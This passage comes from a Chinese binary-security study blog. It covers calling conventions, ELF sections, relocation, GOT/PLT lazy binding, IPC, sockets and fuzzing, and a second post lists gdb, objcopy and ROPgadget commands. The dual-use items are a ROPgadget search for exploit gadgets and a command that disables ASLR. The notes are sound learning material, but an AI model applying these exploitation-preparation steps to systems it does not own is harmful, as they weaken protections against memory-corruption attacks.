8指向a</span><br><span class=\"line\">add eax, [ebp + 0CH]; 堆栈中ebp + 12处保存了b</span><br><span class=\"line\">mov esp, ebp; 恢复esp</span><br><span class=\"line\">pop ebp;</span><br><span class=\"line\">ret; // pop rsp , jmp retn(esp + 8)</span><br></pre></td></tr></table></figure>\n<h5><span id=\"fastcall\">fastcall</span></h5><ul>\n<li>函数的第一个和第二个DWORD参数（或者尺寸更小的）通过ecx和edx传递, 其他参数通过从右向左的顺序压栈 </li>\n<li>被调用函数清理堆栈 </li>\n<li>修饰名为函数名前加上一个“@”符号，后面也是一个“@”符号和其参数的字节数</li>\n</ul>\n<p>可以看到调用时，压栈的顺序是：</p>\n<p>返回地址，ebp、局部变量、函数参数（从右往左）</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/326.png\" alt=\"img\"></p>\n<h4><span id=\"参数传递\">参数传递</span></h4><h5><span id=\"x64\">x64</span></h5><p>依次传参：RDI，RSI，RDX，RCX，R8，R9</p>\n<p>第七个开始则从右向左。</p>\n<h5><span id=\"x86\">x86</span></h5><p>根据调用约定用栈传参。</p>\n<h3><span id=\"elf文件结构\">elf文件结构</span></h3><h4><span id=\"elf文件头\">elf文件头：</span></h4><p>稍微看了一眼，感觉没什么特别值得记的。</p>\n<h4><span id=\"节\">节</span></h4><p>通过file或readelf就是读取elf的文件头。</p>\n<p><code>.text</code> <code>.data</code> <code>.bss</code></p>\n<p>链接视角：<code>section</code></p>\n<p>加载视角：<code>segment</code></p>\n<p><code>.strtab / .shstrtab</code></p>\n<p><strong>字符串表</strong></p>\n<p>在ELF文件中，会用到很多字符串，比如节名，变量名等。所以ELF将所有的字符串集中放到一个表里，每一个字符串以’\\0’分隔，然后使用字符串在表中的偏移来引用字符串。这样在ELF中引用字符串只需要给出一个数组下标即可。字符串表在ELF也以段的形式保存， .shstrtab是专供section name的字符串表。</p>\n<p><code>.symtab</code> </p>\n<p><strong>符号表</strong></p>\n<p>在链接的过程中需要把多个不同的目标文件合并在一起，不同的目标文件相互之间会引用变量和函数。在链接过程中，我们将函数和变量统称为符号，函数名和变量名就是符号名。</p>\n<p>每个定义的符号都有一个相应的值，叫做符号值(Symbol Value)，对于变量和函数，符号值就是它们的地址。</p>\n<p><code>.rel.text</code>：</p>\n<p>一个<code>.text</code> 节中位置的列表，当链接器把这个目标文件和其他文件组合时，需要修改这些位置。一般而言，任何调用外部函数或者引用全局变量的指令都需要修改。另一方面，调用本地函数的指令则不需要修改。注意，可执行目标文件中并不需要重定位信息，因此通常省略，除非用户显式地指示链接器包含这些信息。</p>\n<p><code>.rel.data</code></p>\n<p>被模块引用或定义的所有全局变量的重定位信息。一般而言，任何已初始化的全局变量，如果它的初始值是一个全局变量地址或者外部定义函数的地址，都需要被修改。</p>\n<p><code>.eh_frame / .eh_frame_hdr</code></p>\n<p>在调试程序的时候经常需要进行堆<strong>栈回溯</strong>，早期使用通用寄存器(ebp)来保存每层函数调用的栈帧地址，但局限性很大。后来现代Linux操作系统在LSB(Linux Standard Base)标准中定义了一个.eh_frame section，用来描述如何去unwind the stack。。当函数执行入栈指令后，在该段会保存跟入栈指令一一对应的编码数据，根据这些编码数据，就能计算出当前函数栈大小和cpu的哪些寄存器入栈了，在栈中什么位置。</p>\n<p>太长不看：记录入栈指令，用来实现栈回溯（用于调试）</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/302726082\">https://zhuanlan.zhihu.com/p/302726082</a></p>\n<h4><span id=\"其他\">其他</span></h4><p>为什么要将数据与代码分开：</p>\n<ol>\n<li>可以对不同的节实现不同的权限，例如对数据段设置为可写可读，代码段则设置为只读。</li>\n</ol>\n<ol>\n<li>ida中的elf文件</li>\n</ol>\n<h3><span id=\"链接amp重定位\">链接&amp;重定位</span></h3><p>首先汇编器生成了起始地址为0的代码段和数据段构成的可重定位目标模块。</p>\n<p>这一组模块被输入到链接器中。</p>\n<h4><span id=\"可重定位目标模块\">可重定位目标模块</span></h4><p>可重定位目标模块是什么？</p>\n<p>就比如说一个文件由四个模块组成，编译器最终的目标是将这四个可重定位目标模块组合成一个可执行文件。</p>\n<p>每个模块包含了自己的函数和变量，我们将这些函数和变量统称为符号。</p>\n<h4><span id=\"符号表\">符号表</span></h4><p>而每个可重定位目标模块m都有一个由汇编器构造的符号表，它包含 m 定义和引用的符号的信息。</p>\n<p>符号表中有三种不同的符号：</p>\n<ol>\n<li>由模块 m 定义并能被其他模块引用的<strong>全局符号</strong>。全局链接器符号对应于<strong>非静态的 C 函数</strong>和<strong>全局变量</strong>。</li>\n<li>由其他模块定义并被模块 m 引用的<strong>全局符号</strong>。这些符号称为<strong>外部符号</strong>，对应于在其他模块中定义的非静态 C 函数和全局变量。</li>\n<li><strong>只</strong>被模块 m 定义和引用的<strong>局部符号</strong>。它们对应于带 <strong>static 属性的 C 函数</strong>和<strong>全局变量</strong>。这些符号在模块 m 中任何位置都可见，但是<strong>不能</strong>被其他模块引用。</li>\n</ol>\n<p>我们这里不关注于符号表具体的条目，只是想说明整个链接的流程。</p>\n<p>有了可重定位模块及其符号表，链接器下一步需要做的就是将模块中引用的符号与符号表中确定的符号定义关联起来。</p>\n<p>这里我想要举一个具体的例子。</p>\n<p>这是hello world 程序的可重定位目标文件。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-10-23%20%E4%B8%8B%E5%8D%884.47.32.png\" alt=\"截屏2022-10-23 下午4.47.32\"></p>\n<p>很显然main+0x15的地方只是下一条指令，似乎和我们想要的printf没有什么关联。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@--name:/ctf/work<span class=\"comment\"># readelf -x 11 hello.o</span></span><br><span class=\"line\"></span><br><span class=\"line\">Hex dump of section <span class=\"string\">&#x27;.strtab&#x27;</span>:</span><br><span class=\"line\">  0x00000000 0068656c 6c6f2e63 006d6169 6e005f47 .hello.c.main._G</span><br><span class=\"line\">  0x00000010 4c4f4241 4c5f4f46 46534554 5f544142 LOBAL_OFFSET_TAB</span><br><span class=\"line\">  0x00000020 4c455f00 7072696e 746600            LE_.printf.</span><br></pre></td></tr></table></figure>\n<p>我们能看到字符串表中的<code>printf</code></p>\n<p>符号表</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Symbol table <span class=\"string\">&#x27;.symtab&#x27;</span> contains 12 entries:</span><br><span class=\"line\">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class=\"line\">     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND </span><br><span class=\"line\">     1: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS hello.c</span><br><span class=\"line\">     2: 0000000000000000     0 SECTION LOCAL  DEFAULT    1 </span><br><span class=\"line\">     3: 0000000000000000     0 SECTION LOCAL  DEFAULT    3 </span><br><span class=\"line\">     4: 0000000000000000     0 SECTION LOCAL  DEFAULT    4 </span><br><span class=\"line\">     5: 0000000000000000     0 SECTION LOCAL  DEFAULT    5 </span><br><span class=\"line\">     6: 0000000000000000     0 SECTION LOCAL  DEFAULT    7 </span><br><span class=\"line\">     7: 0000000000000000     0 SECTION LOCAL  DEFAULT    8 </span><br><span class=\"line\">     8: 0000000000000000     0 SECTION LOCAL  DEFAULT    6 </span><br><span class=\"line\">     9: 0000000000000000    28 FUNC    GLOBAL DEFAULT    1 main</span><br><span class=\"line\">    10: 0000000000000000     0 NOTYPE  GLOBAL DEFAULT  UND _GLOBAL_OFFSET_TABLE_</span><br><span class=\"line\">    11: 0000000000000000     0 NOTYPE  GLOBAL DEFAULT  UND <span class=\"built_in\">printf</span></span><br></pre></td></tr></table></figure>\n<p>这个表的列名对应了符号表的结构，UNDEF 代表未定义的符号，也就是在本目标模块中引用，但是却在其他地方定义的符号。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span>     name;      <span class=\"comment\">/* String table offset */</span></span><br><span class=\"line\">    <span class=\"keyword\">char</span>    type:<span class=\"number\">4</span>,    <span class=\"comment\">/* Function or data (4 bits) */</span></span><br><span class=\"line\">            binding:<span class=\"number\">4</span>; <span class=\"comment\">/* Local or global (4 bits) */</span></span><br><span class=\"line\">    <span class=\"keyword\">char</span>    reserved;  <span class=\"comment\">/* Unused */</span></span><br><span class=\"line\">    <span class=\"keyword\">short</span>   section;   <span class=\"comment\">/* Section header index */</span></span><br><span class=\"line\">    <span class=\"keyword\">long</span>    value;     <span class=\"comment\">/* Section offset or absolute address */</span></span><br><span class=\"line\">    <span class=\"keyword\">long</span>    size;      <span class=\"comment\">/* Object size in bytes */</span></span><br><span class=\"line\">&#125; Elf64_Symbol;</span><br></pre></td></tr></table></figure>\n<h4><span id=\"符号解析\">符号解析</span></h4><p>解析符号引用的方法是将每个引用与它输入的可重定位目标文件的符号表中的一个确定的符号定义关联起来，这里分为两种情况。</p>\n<ol>\n<li>引用和定义都在同一个模块的局部符号引用。</li>\n<li>引用和定义在不同模块的符号引用。</li>\n</ol>\n<h4><span id=\"重定位\">重定位</span></h4><p>这个步骤中，链接器将合并输入模块，并为每个符号分配运行时地址。重定位由两步组成：</p>\n<ul>\n<li><p><strong>重定位节和符号定义。</strong>在这一步中，链接器将所有相同类型的节合并为同一类型的新的聚合节。例如，来自所有输入模块的. data 节被全部合并成一个节，这个节成为输出的可执行目标文件的. data 节。然后，链接器将运行时内存地址赋给新的聚合节，赋给输入模块定义的每个节，以及赋给输入模块定义的每个符号。当这一步完成时，程序中的每条指令和全局变量都有唯一的运行时内存地址了。</p>\n</li>\n<li><p><strong>重定位节中的符号引用。</strong>在这一步中，链接器修改代码节和数据节中对每个符号的引用，使得它们指向正确的运行时地址。要执行这一步，链接器依赖于可重定位目标模块中称为<strong>重定位条目</strong>（relocation entry）的数据结构，我们接下来将会描述这种数据结构。</p>\n</li>\n</ul>\n<h4><span id=\"重定位条目\">重定位条目</span></h4><p>代码的重定位条目放在 .rel.text 中。已初始化数据的重定位条目放在 <code>.rel.data</code> </p>\n<p>当汇编器遇到一个最终位置未知的引用时，它简单地将立即数0x0放入引用处，并为这个引用生成一个<strong>重定位条目</strong>放在 <code>.rel .text</code> 中，而这个重定位条目拥有足够多的信息指导链接器在链接时将0x0修改为正确的数值。</p>\n<p>重定位条目格式如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">    <span class=\"keyword\">long</span> offset;    <span class=\"comment\">/* Offset of the reference to relocate */</span></span><br><span class=\"line\">    <span class=\"keyword\">long</span> type:<span class=\"number\">32</span>,   <span class=\"comment\">/* Relocation type */</span></span><br><span class=\"line\">         symbol:<span class=\"number\">32</span>; <span class=\"comment\">/* Symbol table index */</span></span><br><span class=\"line\">    <span class=\"keyword\">long</span> addend;    <span class=\"comment\">/* Constant part of relocation expression */</span></span><br><span class=\"line\">&#125; Elf64_Rela;</span><br></pre></td></tr></table></figure>\n<p>其实重定位过程算法简单来说就是将未知引用地址改为运行时地址，例如：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">*refptr = (<span class=\"keyword\">unsigned</span>) (ADDR(r.symbol) + r.addend);<span class=\"comment\">//绝对寻址</span></span><br></pre></td></tr></table></figure>\n<h3><span id=\"加载\">加载</span></h3><p>一般情况下（aslr未开启），程序由<code>0x400000</code>开始加载。</p>\n<p>当加载器运行时，它创建类似于图 7-15 所示的内存映像。在程序头部表的引导下，加载器将可执行文件的片（chunk）复制到代码段和数据段。接下来，加载器跳转到程序的入口点，也就是 <code>_start</code>函数的地址。这个函数是在系统目标文件 ctrl.o 中定义的，对所有的 C 程序都是一样的。<code>_start</code> 函数调用系统启动函数 __libc_start_main，该函数定义在 libc.so 中。它初始化执行环境，调用用户层的 main 函数，处理 main 函数的返回值，并且在需要的时候把控制返回给内核。</p>\n<p><img src=\"https://1087580735-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MHt_spaxGgCbp2POnfq%2F-MI8pquOBkqRu_B1qWTy%2F-MI8q_Q9zCjP43SJa6VX%2F07-15 Linux x86-64 运行时内存映像.png?alt=media&amp;token=9d8f7d7e-ccda-48d1-814a-8a38ccb2ff8a\" alt=\"img\"></p>\n<h4><span id=\"动态链接共享库\">动态链接共享库</span></h4><p><strong>共享库</strong>（shared library）是致力于解决静态库缺陷的一个现代创新产物。共享库是一个目标模块，在运行或加载时，可以加载到任意的内存地址，并和一个在内存中的程序链接起来。这个过程称为<strong>动态链接</strong>（dynamic linking），是由一个叫做<strong>动态链接器</strong>（dynamic linker）的程序来执行的，在 Linux 系统中通常用 .so 后缀来表示。微软的操作系统大量地使用了共享库，它们称为 DLL（动态链接库）。</p>\n<p>ld - 动态链接器</p>\n<p>libc - 动态链接库</p>\n<h4><span id=\"插桩\">插桩</span></h4><p>Linux 链接器支持一个很强大的技术，称为库打桩（library interpositioning），它允许你截获对共享库函数的调用，取而代之执行自己的代码。使用打桩机制，你可以追踪对某个特殊库函数的调用次数，验证和追踪它的输入和输出值，或者甚至把它替换成一个完全不同的实现。</p>\n<h4><span id=\"延迟绑定\">延迟绑定</span></h4><p>延迟绑定(Lazy Binding)是动态链接器用来减少程序启动时间的一种技术，延迟绑定就是在函数第一次被调用的时候再和函数地址绑定。</p>\n<p>该内容在ret2dl中涉及。（其实学rop的时候也没必要深究我感觉）</p>\n<h5><span id=\"got\">got</span></h5><p>got表有四项内容:</p>\n<p><code>GOT[0]</code>是.dynamic段的装载地址，.dynamic段包含了动态链接器用来绑定过程地址的信息，比如符号的位置和重定位信息;</p>\n<p><code>GOT[1]</code>是动态链接器的标识<code>link_map</code>的地址;</p>\n<p><code>GOT[2]</code> 包含动态链接器的延迟绑定代码<code>_dl_runtime_resolve</code>的入口点，用于得到真正的函数地址，回写到对应的got表中;</p>\n<p><code>GOT[3]</code> 开始就是函数的地址。</p>\n<h5><span id=\"plt\">plt</span></h5><p>PLT 是 Linux ELF 文件中用于延迟绑定的表。实际内容是一段代码</p>\n<h5><span id=\"具体过程\">具体过程</span></h5><p>假设程序中调用 <code>func</code> 函数，该函数在<code>.plt</code> 段中相应的项为<code>func@plt</code>，在<code>.got.plt</code> 中相应的项为 <code>func@got</code>，链接器在初始化时将<code>func@got</code> 中的值填充为 “preapre resolver” 指令处的地址。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">func@plt:</span><br><span class=\"line\">jmp *(func@got)n//prepare resolver</span><br><span class=\"line\">jmp _dl_runtime_resolve</span><br></pre></td></tr></table></figure>\n<p>第一次调用 func 函数时，首先会跳转到 PLT 执行 <code>jmp *(func@got)</code>，由于该函数没被调用过，func@got 中的值不是 func 函数的地址，而是 PLT 中的 “preapre resolver” 指令的地址，所以会跳转到 “preapre resolver” 执行，接着调用 <code>_dl_runtime_resolve</code>解析<code>func</code> 函数的地址，并将该函数真正的地址填充到 <code>func@got</code>，最后跳转到 func 函数继续执行代码。当再次调用 func 函数时，由于 <code>func@got</code> 中已填充正确的函数地址，此时执行 PLT 中的 <code>jmp *(func@got)</code> 即可成功跳转到 func 函数中执行。</p>\n<p>太长不看：首次调用函数时，plt表调用 <code>_dl_runtime_resolve</code>函数填充got表为真实地址，再次调用时，plt调用got表则直接执行到目标函数。</p>\n<h3><span id=\"虚拟内存\">虚拟内存</span></h3><h4><span id=\"内存页\">内存页</span></h4><h3><span id=\"进程间通信\">进程间通信</span></h3><h4><span id=\"进程间通信\">进程间通信：</span></h4><p>信号、管道、消息队列、共享内存</p>\n<p><a href=\"https://www.cnblogs.com/luo77/p/5816326.html\">https://www.cnblogs.com/luo77/p/5816326.html</a></p>\n<h4><span id=\"管道\">管道</span></h4><p>管道的实质是一个内核缓冲区，进程以先进先出的方式从缓冲区存取数据,管道一端的进程顺序地将进程数据写入缓冲区，另一端的进程则顺序地读取数据，该缓冲区可以看做一个循环队列，读和写的位置都是自动增加的，一个数据只能被读一次，读出以后再缓冲区都不复存在了。</p>\n<h5><span id=\"pipe无名管道\">pipe（无名管道）</span></h5><p>通过<code>pipe()</code>系统调用来创建并打开。</p>\n<h5><span id=\"fifo命名管道\">fifo（命名管道）</span></h5><p>通过<code>mknode()</code>系统调用或者<code>mkfifo()</code>函数来建立</p>\n<h4><span id=\"消息队列\">消息队列</span></h4><p>消息队列，就是一个消息的链表，是一系列保存在内核中消息的列表。用户进程可以向消息队列添加消息，也可以向消息队列读取消息。</p>\n<h4><span id=\"共享存储\">共享存储</span></h4><p>共享内存就是映射一段能被其他进程所访问的内存，这段共享内存由一个进程创建，但多个进程都可以访问。共享内存是最快的 IPC 方式，它是针对其他进程间通信方式运行效率低而专门设计的。它往往与其他通信机制，如信号两，配合使用，来实现进程间的同步和通信。</p>\n<p>例如<code>mmap()</code>就可以实现共享内存。</p>\n<h4><span id=\"套接字\">套接字</span></h4><h4><span id=\"信号\">信号</span></h4><p>信号是Linux系统中用于进程之间通信或操作的一种机制。信号是在软件层次上对中断机制的一种模拟，是一种异步通信方式，信号可以在用户空间进程和内核之间直接交互。内核也可以利用信号来通知用户空间的进程来通知用户空间发生了哪些系统事件。信号事件有两个来源：</p>\n<p>1）硬件来源，例如按下了cltr+C，通常产生中断信号sigint</p>\n<p>2）软件来源，例如使用系统调用或者命令发出信号。最常用的发送信号的系统函数是kill,raise,setitimer,sigation,sigqueue函数。软件来源还包括一些非法运算等操作。</p>\n<p>有两个信号是应用进程无法捕捉和忽略的，即SIGKILL和SEGSTOP，这是为了使系统管理员能在任何时候中断或结束某一特定的进程。</p>\n<h4><span id=\"fork\">fork()</span></h4><p>操作系统会复制一个与父进程完全相同的子进程，虽说是父子关系，但是在操作系统看来，他们更像兄弟关系，这2个进程共享代码空间，但是数据空间是互相独立的，子进程数据空间中的内容是父进程的<strong>完整拷贝</strong>，指令指针也完全相同，子进程拥有父进程当前运行到的位置。</p>\n<h3><span id=\"网络编程\">网络编程</span></h3><h4><span id=\"socket编程\">SOCKET编程</span></h4><p><a href=\"https://zhuanlan.zhihu.com/p/180556309\">https://zhuanlan.zhihu.com/p/180556309</a></p>\n<p>上一个part讲了进程间通信的几种常用方式，但是无论哪种，都仅限于本机之间的通信。而网间进程通信要解决的是不同主机进程间的相互通信问题。</p>\n<p>同一主机上，不同进程可用进程号（PID）唯一标识。但在网络环境下，各主机独立分配的进程号不能唯一标识该进程。 其次，操作系统支持的网络协议众多，不同协议的工作方式不同，地址格式也不同。因此，网间进程通信还要解决多重协议的识别问题。</p>\n<p>例如TCP/IP协议族利用ip地址，协议，端口即可标识网络的进程。使用TCP/IP协议的应用程序通常采用应用编程接口：UNIX BSD的套接字（socket）来实现网络进程之间的通信。</p>\n<h5><span id=\"tcpip\">TCP/IP</span></h5><p><img src=\"https://pic3.zhimg.com/80/v2-d2614341b32b9946bfa10fd3b1419002_1440w.webp\" alt=\"img\"></p>\n<p>太具体的什么协议之类的就不放了</p>\n<h5><span id=\"socket是什么\">socket是什么</span></h5><p>其实网上讲得都还蛮抽象的，我的理解就是这个东西是一个帮助我们进行tcp/ip通信的工具，就比如说我要给山崎桑送生日礼物，原本我需要拿到山崎桑的地址，然后坐飞机飞到日本，再打车去找他，但是现在有ems国际了，所以我只需要利用国际邮政，填一下地址就行了这样。所以这里这个ems就是socket，地址就是ip和port，它将复杂的协议通信抽象为了一个api。</p>\n<p>（说到山崎，今天的日九还没看555，吃饭看吧）</p>\n<h5><span id=\"socket通信流程\">socket通信流程</span></h5><p>socket通信流程如下：</p>\n<p>连接</p>\n<ol>\n<li>服务器端会根据IP地址类型（IPv4/IPv6)、Socket 类型和协议创建一个socket，并为为 Socket 绑定 IP 地址和端口号，然后监听端口请求，随时准备接收客户端发来的连接。</li>\n<li>客户端打开 Socket，根据服务器 IP 地址和端口试图连接服务端的Socket。务器Socket接收到客户端Socket请求，被动打开开始接收客户端请求，直到客户端返回连接信息，此时 Socket 进入阻塞状态。</li>\n</ol>\n<p>交互</p>\n<ol>\n<li>客户端连接成功向服务端发送连接状态信息</li>\n<li>服务端 Accept 返回连接成功</li>\n<li>客户端向 Socket 写入数据</li>\n<li>服务端读取数据</li>\n<li>客户端关闭</li>\n</ol>\n<h3><span id=\"linux文件系统\">linux文件系统</span></h3><h4><span id=\"概述\">概述</span></h4><p><img src=\"https://www.runoob.com/wp-content/uploads/2014/06/d0c50-linux2bfile2bsystem2bhierarchy.jpg\" alt=\"img\"></p>\n<ul>\n<li><strong>/etc：</strong><br>etc 是 Etcetera(等等) 的缩写,这个目录用来存放所有的系统管理所需要的配置文件和子目录。</li>\n<li><strong>/bin</strong>：<br>bin 是 Binaries (二进制文件) 的缩写, 这个目录存放着最经常使用的命令。</li>\n<li><strong>/proc</strong>：<br>proc 是 Processes(进程) 的缩写，/proc 是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。</li>\n<li><strong>/sbin</strong>：<br>s 就是 Super User 的意思，是 Superuser Binaries (超级用户的二进制文件) 的缩写，这里存放的是系统管理员使用的系统管理程序。</li>\n<li><strong>/usr</strong>：<br> usr 是 unix shared resources(共享资源) 的缩写，这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于 windows 下的 program files 目录。</li>\n<li><strong>/usr/src：</strong><br>内核源代码默认的放置目录。</li>\n</ul>\n<h4><span id=\"软硬连接\">软硬连接</span></h4><h5><span id=\"软链接\">软链接</span></h5><p>为某个文件在另外一个位置建立一个同不的链接。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ln -s 源文件 目标文件。 </span><br></pre></td></tr></table></figure>\n<h5><span id=\"硬链接\">硬链接</span></h5><p>允许一个文件拥有多个有效路径名，这样用户就可以建立硬连接到重要文件，以防止“误删”的功能。</p>\n<h4><span id=\"环境变量\">环境变量</span></h4><p>。</p>\n<h2><span id=\"其他\">其他</span></h2><h3><span id=\"kernel-漏洞\">kernel 漏洞</span></h3><h4><span id=\"kernel-uaf\">kernel uaf</span></h4><h4><span id=\"kernel-rop\">kernel rop</span></h4><h3><span id=\"fuzz\">fuzz</span></h3><h4><span id=\"基本原理\">基本原理</span></h4><p>Fuzzing引擎算法中，测试用例的生成方式主要有2种：</p>\n<p>1）基于变异：根据已知数据样本通过变异的方法生成新的测试用例；</p>\n<p>2）基于生成：根据已知的协议或接口规范进行建模，生成测试用例；</p>\n<p>AFL就是著名的基于变异的Fuzzer。</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/43432370\">Fuzzing技术总结（Brief Surveys on Fuzz Testing）</a></p>\n<h5><span id=\"变异\">变异：</span></h5><p>afl中变异其实就是对输入进行移位，reverse等操作。</p>\n<h4><span id=\"afl\">afl</span></h4><p>饿</p>\n<p><a href=\"https://blog.csdn.net/gengzhikui1992/article/details/50844857\">https://blog.csdn.net/gengzhikui1992/article/details/50844857</a></p>\n<p><a href=\"https://paper.seebug.org/496/\">AFL(American Fuzzy Lop)实现细节与文件变异</a></p>\n<p><a href=\"http://rk700.github.io/2017/12/28/afl-internals/\">AFL内部实现细节小记</a></p>\n<p><a href=\"https://kiprey.github.io/2020/07/AFL-LLVM-Mode/\">AFL的LLVM_Mode</a></p>\n<h4><span id=\"syzkaller使用\">syzkaller使用</span></h4><p>白盒fz。</p>\n<h4><span id=\"基本的fuzz代码优化\">基本的fuzz代码优化</span></h4><p>不知道orz</p>\n<h4><span id=\"llvm\">llvm</span></h4><h3><span id=\"v8ampchrome\">v8&amp;Chrome</span></h3><p><a href=\"https://kiprey.github.io/2020/11/fetch-chromium/\">https://kiprey.github.io/2020/11/fetch-chromium/</a></p>\n<p><a href=\"https://kiprey.github.io/2020/10/CVE-2020-6549/\">https://kiprey.github.io/2020/10/CVE-2020-6549/</a></p>\n<p><a href=\"https://kiprey.github.io/2020/10/CVE-2019-5826/#一、环境搭建\">https://kiprey.github.io/2020/10/CVE-2019-5826/#一、环境搭建</a></p>\n<h3><span id=\"gdb使用\">gdb使用</span></h3><h4><span id=\"断点原理内存amp硬件amp软件断点\">断点原理（内存&amp;硬件&amp;软件断点）</span></h4><p>软件断点：由非法指令异常实现，适用于运行于内存中的程序（软件实现）。以x86为例，向某个地址打入断点，实际上就是往该地址写入断点指令INT 3，即0xCC。目标程序运行到这条指令之后就会触发SIGTRAP信号，gdb捕获到这个信号，根据目标程序当前停止位置查询gdb维护的断点链表，若发现在该地址确实存在断点，则可判定为断点命中。</p>\n<p>硬件断点：由硬件特性实现（数量有限），适用于直接在flash中运行的程序。</p>\n<p>之所以要区分硬件和软件断点，是因为软件断点要往某个地址写入断点指令的，那么最起码该地址应该是可写的吧？大多数时候，我们的程序是会被加载到<a href=\"https://so.csdn.net/so/search?q=内存&amp;spm=1001.2101.3001.7020\">内存</a>（RAM）中执行的，RAM是可读可写，这时候软件断电就是有效的。<br>但是，对于某些比较重要的程序，可能会直接在flash中执行，并且flash对用户可能是只读的，这时候软件断点就没有用了，因为没办法写进断点指令，此时必须依赖于硬件断点。这就是软件断点和硬件断点使用上的不同。</p>\n<p>hb为硬件断点，使用方式与软中断相同。</p>\n<p>内存断点：<code>watch</code>指令。监控变量或表达式的值。</p>\n<h4><span id=\"一些常见指令\">一些常见指令</span></h4><p><a href=\"https://wizardforcel.gitbooks.io/100-gdb-tips/content/show-version.html\">https://wizardforcel.gitbooks.io/100-gdb-tips/content/show-version.html</a></p>\n<h3><span id=\"iot\">iot</span></h3><h4><span id=\"测信道攻击俺只知道这个\">测信道攻击（俺只知道这个）</span></h4><h3><span id=\"条件竞争\">条件竞争</span></h3><p>呃呃，只有一点了解。</p>\n","categories":["Binary_security"],"tags":["Generalization"]},{"title":"杂碎的指令","url":"/2021/04/24/sum_%E6%9D%82%E7%A2%8E%E7%9A%84%E6%8C%87%E4%BB%A4/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>[TOC]</p>\n<p>​    \n    <div id=\"aplayer-HfrqKxJV\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<h2><span id=\"杂碎的知识点\">杂碎的知识点</span></h2><h3><span id=\"1调试相关\">1）调试相关</span></h3><h5><span id=\"1gdb\">1）gdb</span></h5><p>ropgagdet</p>\n<p>ROPgadget —binary （） —only “pop|ret” | grep rdi</p>\n<p>(基本适用于ret2csu这种万能gagdet的寻找)</p>\n<p>例如<code>ROPgadget --binary calc --only &quot;pop|ret&quot; | grep eax</code></p>\n<h5><span id=\"2内存断点硬件断点\">2）内存断点？硬件断点？</span></h5><h6><span id=\"原理\">原理</span></h6><p>对所访问内存地址设置为不可读写，当访问时触发中断。</p>\n<h6><span id=\"设置方式\">设置方式</span></h6><p>参见pwndbg那张巨长的图。</p>\n<p><code>watch 0x123456</code></p>\n<p><code>watch a</code></p>\n<h5><span id=\"加载调试符号\">加载调试符号</span></h5><p>​        对于没有stripped的程序，抽取制作调试符号：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">objcopy --only-keep-debug ELF_DEBUG xx.symbol</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​        加载符号表</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">gdb --symbol=xx.symbol -<span class=\"built_in\">exec</span>=ELF_RELEASE</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>或者直接利用有调试符号的elf作为符号表来源</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">gdb --symbol=ELF -<span class=\"built_in\">exec</span>=ELF_RELEASE</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>直接为ELF文件添加符号表链接</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">objcopy --add-gnu-debuglink=xx.symbol ELF_RELEASE</span><br></pre></td></tr></table></figure>\n<h5><span id=\"关闭系统环境地址随机化\">关闭系统环境地址随机化</span></h5><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> 0 &gt;/proc/sys/kernel/randomize_va_space </span><br></pre></td></tr></table></figure>\n<p>打开则设置为2。</p>\n<h3><span id=\"2汇编指令\">2）汇编指令</span></h3><h4><span id=\"跳转指令\">跳转指令</span></h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">JE   ;等于则跳转</span><br><span class=\"line\">JNE  ;不等于则跳转</span><br><span class=\"line\"></span><br><span class=\"line\">JZ   ;为 0 则跳转</span><br><span class=\"line\">JNZ  ;不为 0 则跳转</span><br><span class=\"line\"></span><br><span class=\"line\">JS   ;为负则跳转</span><br><span class=\"line\">JNS  ;不为负则跳转</span><br><span class=\"line\"></span><br><span class=\"line\">JC   ;进位则跳转</span><br><span class=\"line\">JNC  ;不进位则跳转</span><br><span class=\"line\"></span><br><span class=\"line\">JO   ;溢出则跳转</span><br><span class=\"line\">JNO  